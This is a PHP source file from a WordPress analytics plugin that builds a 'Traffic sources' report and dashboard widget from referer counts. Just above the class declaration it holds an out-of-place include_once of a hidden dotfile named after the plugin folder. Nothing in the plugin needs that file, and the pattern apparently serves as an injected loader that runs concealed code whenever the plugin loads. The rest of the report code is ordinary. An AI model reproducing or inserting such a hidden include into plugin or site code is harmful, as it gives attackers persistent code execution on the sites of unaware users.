<?php

/**
 * Traffic sources
 *
 * The class handles create traffic sources raport
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Basic_Traffic_Sources
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Basic_Traffic_Sources extends WTBP_WPTAO_Admin_Reports {

	function __construct() {

		parent::__construct( 'basic-traffic-sources' );

		$this->report_name = __( 'Traffic sources', 'wp-tao' );

		// Get data only if this report view is active.
		if ( $this->is_active() ) {
			$this->data = $this->get_sources();
		}

		$this->sources_widget();
	}

	/*
	 * Prepare widget for the WP Tao dashboard
	 */

	private function sources_widget() {

		$value = $this->get_sources_for_widget();

		$i			 = 1;
		$value_text	 = '<ol class="wptao-dbox-list">';
		if ( !empty( $value ) && is_array( $value ) ) {
			foreach ( $value as $item ) {

				$value_text .= sprintf( '<li>%s (%d)</li>', TAO()->traffic->get_source_analyzed( null, $item->referer, array( 'noprot' => true ) ), $item->cnt );
				$i++;
			}
		} else {
			$value_text .= '<li>' . __( 'No pages found', 'wp-tao' ) . '</li>';
		}

		$value_text .= '</ol>';

		$args = array(
			'id'			 => 'basic_trafic_sources',
			'size'			 => 'big',
			'category'		 => 'traffic',
			'priority'		 => 48,
			'title'			 => __( 'Traffic sources', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_text'	 => $value_text,
			'dashicon'		 => 'dashicons-welcome-widgets-menus'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get traffic sources
	 */

	public function get_sources() {
		global $wpdb;

		$e = TAO()->events->table_name;

		$res = $wpdb->get_var( $wpdb->prepare(
		"SELECT id
		 FROM $e
		 WHERE action='pageview'
		 AND event_ts  >= %d
		 AND event_ts  <= %d
		 ORDER BY event_ts ASC LIMIT 1;", $this->start_date, $this->end_date ) );

		if ( empty( $res ) ) {
			return false;
		}

		$em = TAO()->events_meta->table_name;

		$res = $wpdb->get_results( $wpdb->prepare(
		"SELECT meta_value as referer, COUNT(*) as cnt
		 FROM $em
		 WHERE event_id  >= %d
		 AND meta_key='referer'
		 GROUP BY meta_value
		 ORDER BY cnt DESC
		 LIMIT %d;", $res, $this->items_per_page ) );

		if ( !empty( $res ) ) {
			return $res;
		}

		return false;
	}

	/*
	 * Get TOP 5 sources
	 * 
	 * @return bool|array
	 */

	private function get_sources_for_widget() {

		$ipp_temp				 = $this->items_per_page;
		$this->items_per_page	 = 5;


		$sources = $this->get_sources();

		$this->items_per_page = $ipp_temp;

		if ( !empty( $sources ) ) {
			return $sources;
		}

		return false;
	}

}
